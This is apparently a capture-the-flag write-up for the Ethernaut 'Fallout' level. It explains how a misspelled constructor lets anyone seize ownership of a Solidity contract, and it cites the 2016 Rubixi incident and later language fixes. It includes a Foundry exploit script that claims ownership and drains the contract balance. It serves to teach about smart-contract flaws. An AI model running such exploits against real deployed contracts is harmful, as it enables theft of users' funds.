# 02 - Fallout

## 1. Challenge Overview

- **Objective**: Claim ownership of the contract.
- **Vulnerability Category**: Misnamed Constructor / Public Initialization Function (CWE-1188 / SWC-118).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

---

## 3. Vulnerability Analysis

### The Flaw

In Solidity versions prior to `0.4.22`, constructors were identified by matching the function name with the contract name:

```solidity
contract Fallout {
    function Fallout() public { ... } // Old-style constructor
}
```

In this contract, the developer introduced a typographical error:

- Contract name: `Fallout` (double 'l')
- Intended constructor: `Fal1out` (letter 'l' followed by digit '1')

Because the function name did not match the contract name, the Solidity compiler did not treat `Fal1out()` as initialization code. Instead:

1. It assigned `Fal1out()` a standard 4-byte selector: `bytes4(keccak256("Fal1out()"))` = `0x6fab5ddf`.
2. It added `Fal1out()` to the contract's public runtime dispatch table.
3. Anyone could invoke `Fal1out()` at any point after deployment to overwrite `owner = msg.sender`.

Furthermore, while the function was marked `payable`, it contained no `require(msg.value > 0)`, meaning the caller did not even need to supply any Ether to claim ownership.

---

## 4. Real-World Case Study: The Rubixi Hack (2016)

This challenge directly mirrors a real-world incident in 2016 involving a smart contract called **Rubixi**.

The creator originally named the project `DynamicPyramid`. When rebranding to `Rubixi`, they modified the contract declaration (`contract Rubixi`), but failed to rename the constructor function (`function DynamicPyramid()`). A savvy observer recognized that `DynamicPyramid()` was a regular public function on `Rubixi`, called it, seized owner privileges, and withdrew all accumulated contract fees.

---

## 5. Exploit Strategy & Execution

### Interface

```solidity
interface IFallout {
    function Fal1out() external payable;
    function collectAllocations() external;
    function owner() external view returns (address);
}
```

### Exploit Script (`script/02-Fallout.s.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IFallout} from "../src/interfaces/IFallout.sol";

contract FalloutScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IFallout target = IFallout(instance);

        console2.log("Current owner before exploit:", target.owner());

        vm.startBroadcast(privateKey);

        // Call the misspelled constructor function to claim ownership
        target.Fal1out();

        // Drain any balance if available
        if (instance.balance > 0) {
            target.collectAllocations();
        }

        vm.stopBroadcast();

        console2.log("New owner after exploit:", target.owner());
    }
}
```

### Workflow Execution

1. **Simulation (Dry Run)**:

   ```bash
   make sim LEVEL=02
   ```

2. **On-Chain Execution**:

   ```bash
   make exploit LEVEL=02
   ```

3. **Verification**:

   ```bash
   make owner
   ```

---

## 6. Prevention & Language Evolution

- **Solidity 0.4.22+**: Introduced the dedicated `constructor()` keyword, separating contract naming from constructor definition.
- **Solidity 0.5.0+**: Completely removed support for named constructors, throwing a compilation error if a function shares the contract name.
- **Compiler Linters & Static Analysis**: Tools like Slither (`slither .`) detect unprotected state-changing functions and naming anomalies.
